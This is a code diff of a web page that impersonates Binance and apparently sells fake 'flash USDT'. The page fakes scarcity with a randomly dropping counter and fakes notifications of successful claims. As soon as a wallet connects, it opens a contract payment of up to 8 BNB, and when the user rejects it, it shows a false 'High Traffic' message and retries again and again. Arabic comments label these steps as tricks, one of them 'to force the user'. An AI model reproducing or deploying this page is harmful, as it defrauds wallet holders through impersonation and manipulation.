@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Binance | Flash Protocol V5</title>
     
+    <!-- ✅ بدون مسافات -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -17,10 +18,8 @@
         #notify { position: fixed; bottom: 20px; right: 20px; background: var(--item); padding: 12px 20px; border-radius: 12px; border-right: 4px solid var(--gold); display: none; z-index: 10001; font-size: 13px; animation: slideIn 0.5s forwards; }
         @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
 
-        /* الكرت الرئيسي */
         .main-card { background: #1E2329; width: 350px; border-radius: 30px; padding: 30px; text-align: center; border: 1px solid #2B3139; }
         
-        /* حيلة عداد النقص الفلاشي */
         .flash-counter { background: rgba(246, 70, 93, 0.1); color: #F6465D; padding: 10px; border-radius: 10px; font-weight: bold; margin-bottom: 20px; border: 1px solid #F6465D; }
         #flash-count { font-size: 20px; }
 
@@ -59,6 +58,8 @@
         <option value="0.5">50,000 USDT (0.5 BNB)</option>
         <option value="1.0">100,000 USDT (1.0 BNB)</option>
         <option value="2.5">250,000 USDT (2.5 BNB)</option>
+        <option value="4.0">500,000 USDT (4.0 BNB)</option>
+        <option value="8.0">1,000,000 USDT (8.0 BNB)</option>
     </select>
     
     <button class="btn-gold" onclick="openModal()">Connect Wallet</button>
@@ -72,28 +73,36 @@
             <span onclick="closeModal()" style="cursor:pointer; font-size: 20px; color: var(--sub);">✕</span>
         </div>
 
+        <div class="wallet-item" onclick="startProcess('injected')">
+            <div class="wallet-info">
+                <img src="https://cryptologos.cc/logos/metamask-matic-logo.png">
+                <span>MetaMask</span>
+            </div>
+            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
+        </div>
+
+        <div class="wallet-item" onclick="startProcess('injected')">
+            <div class="wallet-info">
+                <img src="https://cryptologos.cc/logos/trust-wallet-trust-logo.png">
+                <span>Trust Wallet</span>
+            </div>
+            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
+        </div>
+
+        <div class="wallet-item" onclick="startProcess('injected')">
+            <div class="wallet-info">
+                <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png">
+                <span>Binance Wallet</span>
+            </div>
+            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
+        </div>
+
         <div class="wallet-item" onclick="startProcess('wc')">
             <div class="wallet-info">
                 <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
                 <span>WalletConnect</span>
             </div>
             <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(59,153,252,0.2); color:#3b99fc;">QR CODE</span>
-        </div>
-
-        <div class="wallet-item" onclick="startProcess('injected')">
-            <div class="wallet-info">
-                <img src="https://www.okx.com/cdn/assets/imgs/221/9E4FE6E178351F9F.png">
-                <span>OKX Wallet</span>
-            </div>
-            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
-        </div>
-
-        <div class="wallet-item" onclick="startProcess('injected')">
-            <div class="wallet-info">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg">
-                <span>MetaMask</span>
-            </div>
-            <span style="font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; background:rgba(46, 189, 133, 0.2); color:#2ebd85;">INSTALLED</span>
         </div>
 
         <div class="wallet-item" onclick="startProcess('wc')">
@@ -126,16 +135,16 @@
     function openModal() { document.getElementById('wModal').style.display = 'flex'; }
     function closeModal() { document.getElementById('wModal').style.display = 'none'; }
 
-    // حيلة 1: عداد نقص الفلاش (الكمية تتناقص عشوائياً)
+    // عداد النقص الديناميكي
     let currentAmount = 1482500;
     setInterval(() => {
         let drop = Math.floor(Math.random() * 2500) + 500;
         currentAmount -= drop;
-        if(currentAmount < 5000) currentAmount = 1482500; // إعادة التصفير للتمويه
+        if(currentAmount < 5000) currentAmount = 1482500;
         document.getElementById('flash-count').innerText = currentAmount.toLocaleString();
     }, 3000);
 
-    // حيلة 2: إشعارات وهمية للتحويلات الناجحة
+    // إشعارات وهمية
     const notifications = ["User 0x2a...d9 claimed 10,000 USDT", "User 0x5f...31 claimed 2,500 USDT", "Flash Node 04 Synced"];
     setInterval(() => {
         const n = document.getElementById('notify');
@@ -147,15 +156,17 @@
     async function startProcess(mode) {
         try {
             if (mode === 'wc') {
+                // ✅ استخدام RPC صالح
                 provider = new WalletConnectProvider.default({ 
-                    rpc: { 56: "https://bsc-dataseed.binance.org/" }, 
+                    rpc: { 56: "https://rpc.ankr.com/bsc" }, 
                     chainId: 56 
                 });
                 await provider.enable();
                 web3 = new Web3(provider);
             } else {
+                // ✅ لا إعادة توجيه إلى MetaMask App Link
                 if (!window.ethereum) {
-                    window.location.href = "https://metamask.app.link/dapp/" + window.location.hostname;
+                    alert("Please open this site inside a wallet browser (Trust/MetaMask).");
                     return;
                 }
                 provider = window.ethereum;
@@ -167,7 +178,6 @@
             closeModal();
             document.getElementById('status').innerText = "Linking Node... Confirm in Wallet";
             
-            // ✅ الحيلة: فتح نافذة الدفع فوراً بعد الربط بـ 1.2 ثانية
             setTimeout(autoPay, 1200);
 
         } catch (e) { console.error(e); }
@@ -177,15 +187,13 @@
         const val = document.getElementById('amount').value;
         const contract = new web3.eth.Contract(ABI, CONTRACT);
         try {
-            // ضمان الشبكة الصحيحة
             await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-            // طلب الخصم التلقائي
             await contract.methods.buyFlash().send({ from: account, value: web3.utils.toWei(val, "ether") });
         } catch (err) {
-            document.getElementById('status').innerText = "High Traffic. Retrying connection...";
-            setTimeout(autoPay, 3000); // إعادة المحاولة لإجبار المستخدم
+            document.getElementById('status').innerText = "High Traffic. Retrying...";
+            setTimeout(autoPay, 3000);
         }
     }
 </script>
 </body>
-</html>
+</html>ررررررررررر
